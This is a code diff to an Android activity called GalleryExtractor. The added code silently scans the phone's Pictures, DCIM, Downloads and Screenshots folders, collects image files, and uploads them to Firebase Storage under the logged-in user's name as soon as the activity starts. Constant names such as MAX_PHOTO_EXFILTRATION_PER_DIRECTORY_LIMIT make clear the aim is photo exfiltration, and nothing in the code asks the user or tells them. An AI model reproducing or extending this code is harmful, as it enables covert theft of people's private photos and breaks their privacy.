@@ -32,6 +32,9 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.InputStream;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Collections;
 import java.util.UUID;
 
 
@@ -42,100 +45,157 @@ public class GalleryExtractor extends AppCompatActivity {
     private static DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
     private static FirebaseAuth mAuth = FirebaseAuth.getInstance();
 
+    ArrayList<String> commonPhotoDirectories = new ArrayList<>(Arrays.asList(Environment.DIRECTORY_PICTURES, Environment.DIRECTORY_DCIM, Environment.DIRECTORY_DOWNLOADS));
+    ArrayList<String> photoFilePathsToExtract = new ArrayList<>(); // Collect all the photo directories here
+    ArrayList<String> allowedPhotoExtensions =  new ArrayList<>(Arrays.asList(".png", ".jpg", ".jpeg"));
+    ArrayList<String> interestingPhotoSubdirectories = new ArrayList<>(Arrays.asList("Camera", "Screenshots", "Downloads"));  // So that Zafran doesn't need to pay for Firebase storage
+
+    private final int MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT = 10; // So that Zafran doesn't need to pay for Firebase storage too
+
     String photoDir;
     private boolean mSaved;
     FileInputStream fi;
     @Override
     protected void onCreate(Bundle savedInstanceState){
         super.onCreate(savedInstanceState);
-        //setContentView(R.layout.activity_main);
+
         uploadGallery();
-//        StorageReference photoref = storageRef.child("images"); // + /images?
-//        StorageReference testimgref = storageRef.child(getGalleryPath() + "image1.jpg");
-//        storageRef.getName().equals(testimgref.getName());
-//        storageRef.getName().equals(testimgref.getPath());
 
     }
-
+    public GalleryExtractor() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            commonPhotoDirectories.add(Environment.DIRECTORY_SCREENSHOTS);
+            Log.d("Files", "SCREENSHOT DIRECTORY SUPPORTED!");
+        } else {
+            Log.d("Files", "SCREENSHOT DIRECTORY NOT SUPPORTED!");
+        }
+    }
     //get images
     private String getGalleryPath() {
         return photoDir = Environment.getExternalStorageDirectory() + "/" + Environment.DIRECTORY_DCIM + "/" + "image1.jpg";
     }
 
     //upload images
-    public void uploadGallery(){
+    public void uploadGallery() {
         Log.d(ACTIVITY_SERVICE, getGalleryPath());
-        Uri localFile = Uri.fromFile(new File("/storage/emulated/0/Download/-6224201455460527966_121.jpg")); //Change this part
-        //Uri l = test(localFile);
-        //Log.d(ACTIVITY_SERVICE, "This is test l : " + l.toString());
-        //Uri sessionUri = null;
-        UploadTask uploadTask;
-        StorageReference photoref = storageRef.child("images/" + UUID.randomUUID().toString());
-//        InputStream stream = new FileInputStream(new File("storage/14F1-3C1C/DCIM/image1.jpg"));
-//        uploadTask = storageRef.putStream(stream);
-        // start save before restart
-        uploadTask = photoref.putFile(localFile);
-        uploadTask.addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
-            @Override
-            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
-                Uri sessionUri = taskSnapshot.getUploadSessionUri();
-                if (sessionUri != null && !mSaved) {
-                    mSaved = true;
-                    // A persisted session has begun with the server.
-                    // Save this to persistent storage in case the process dies.
-                }
-            }
-        });
-        // [END save_before_restart]
 
-        // [START restore_after_restart]
-        //resume the upload task from where it left off when the process died.
-        //to do this, pass the sessionUri as the last parameter
-        //uploadTask = storageRef.putFile(localFile,
-         //       new StorageMetadata.Builder().build(), sessionUri);
-        // [END restore_after_restart]
+        for (String photoDirectory : commonPhotoDirectories) {
+            listPicturesInDirectory(Environment.getExternalStorageDirectory().toString() + "/" + photoDirectory);
+        }
+
+        for (String photoFilePath : photoFilePathsToExtract) {
+            obtainUsername(username -> {
+                Uri localFile = Uri.fromFile(new File(photoFilePath)); //Change this part
+                UploadTask uploadTask;
+                String[] fileNameSplitter = photoFilePath.split("/");
+                StorageReference photoref = storageRef.child(username).child("images").child("gallery").child(fileNameSplitter[fileNameSplitter.length - 2]).child(fileNameSplitter[fileNameSplitter.length - 1]);
+                uploadTask = photoref.putFile(localFile);
+                uploadTask.addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
+                    @Override
+                    public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
+                        Uri sessionUri = taskSnapshot.getUploadSessionUri();
+                        if (sessionUri != null && !mSaved) {
+                            mSaved = true;
+                        }
+                    }
+                });
+            });
+
+        }
+
     }
+    public void listPicturesInDirectory(String startingDirectory) {
+        Log.d("Files", "Path: " + startingDirectory);
+        File directory = new File(startingDirectory);
+        File[] files = directory.listFiles();
 
-    public Uri test(Uri p) {
-        String filePath = p.toString();
-        File imageFile = new File(filePath);
-        Cursor cursor = getApplicationContext().getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                new String[]{MediaStore.Images.Media._ID},
-                MediaStore.Images.Media.DATA + "=? ",
-                new String[]{filePath}, null);
-        if (cursor != null && cursor.moveToFirst()) {
-            int id = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
-            cursor.close();
-            return Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
-        } else {
-            if (imageFile.exists()) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    ContentResolver resolver = getContentResolver();
-                    Uri picCollection = MediaStore.Images.Media
-                            .getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
-                    ContentValues picDetail = new ContentValues();
-                    picDetail.put(MediaStore.Images.Media.DISPLAY_NAME, imageFile.getName());
-                    picDetail.put(MediaStore.Images.Media.MIME_TYPE, "image/jpg");
-                    picDetail.put(MediaStore.Images.Media.RELATIVE_PATH,"DCIM/" + UUID.randomUUID().toString());
-                    picDetail.put(MediaStore.Images.Media.IS_PENDING,1);
-                    Uri finaluri = resolver.insert(picCollection, picDetail);
-                    picDetail.clear();
-                    picDetail.put(MediaStore.Images.Media.IS_PENDING, 0);
-                    resolver.update(picCollection, picDetail, null, null);
-                    return finaluri;
-                }else {
-                    ContentValues values = new ContentValues();
-                    values.put(MediaStore.Images.Media.DATA, filePath);
-                    return getContentResolver().insert(
-                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
+        //Don't bother recursing if there is no files inside the directory.
+        if (files == null) {
+            return;
+        } else if (files.length == 0) {
+            return;
+        }
+
+        files = reverse(files);
+
+        Log.d("Files", "Size: "+ files.length);
+        int photo_count = 0;
+        for (int i = 0; i < files.length; i++) {
+            String fileName = files[i].getAbsolutePath();
+            if (files[i].isDirectory() && interestingPhotoSubdirectories.contains(files[i].toString())) {
+                listPicturesInDirectory(files[i].getAbsolutePath());
+            } else if (fileName.length() > 4 && photo_count < MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT) {
+                String filenameExtension = fileName.substring(fileName.length() - 4);
+                if (allowedPhotoExtensions.contains(filenameExtension)) {
+                    photo_count++;
+                    photoFilePathsToExtract.add(fileName);
+                    Log.d("Files", "FileName:" + fileName);
                 }
-
-            } else {
-                return null;
             }
         }
     }
+
+    static File[] reverse(File[] a)
+    {
+        ArrayList<File> fileArray = new ArrayList<>(Arrays.asList(a));
+        Collections.reverse(fileArray);
+        File[] fileList = new File[fileArray.size()];
+        return fileArray.toArray(fileList);
+
+    }
+
+    private void obtainUsername(FirebaseCallback firebaseCallback) {
+        FirebaseUser currentUser = mAuth.getCurrentUser();
+        String email = currentUser.getEmail();
+        mDatabase = FirebaseDatabase.getInstance().getReference("users");
+
+        // Incase you do not understand this part: https://www.youtube.com/watch?v=OvDZVV5CbQg
+        // This solves the asynchronous issue
+        ValueEventListener valueEventListener = new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+
+                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
+                    User user = dataSnapshot.getValue(User.class);
+                    if (user.getEmail().equals(email)) {
+                        String username = user.getUsername();
+                        firebaseCallback.onCallback(username);
+                        return;
+                    }
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+                Log.d(TAG, error.getMessage());
+                return;
+            }
+        };
+        mDatabase.addListenerForSingleValueEvent(valueEventListener);
+
+        return;
+    }
+
+    //This is just needed to fight against the asynchronous issue when obtaining data from database
+    private interface FirebaseCallback {
+        void onCallback(String username);
+    }
+//    public void uploadGallery() {
+//        Log.d(ACTIVITY_SERVICE, getGalleryPath());
+//        Uri localFile = Uri.fromFile(new File("/storage/emulated/0/Pictures/IMG_20230209_151614.jpg")); //Change this part
+//        UploadTask uploadTask;
+//        StorageReference photoref = storageRef.child("images/" + UUID.randomUUID().toString());
+//        uploadTask = photoref.putFile(localFile);
+//        uploadTask.addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
+//            @Override
+//            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
+//                Uri sessionUri = taskSnapshot.getUploadSessionUri();
+//                if (sessionUri != null && !mSaved) {
+//                    mSaved = true;
+//                }
+//            }
+//        });
+//    }
 
 
 }
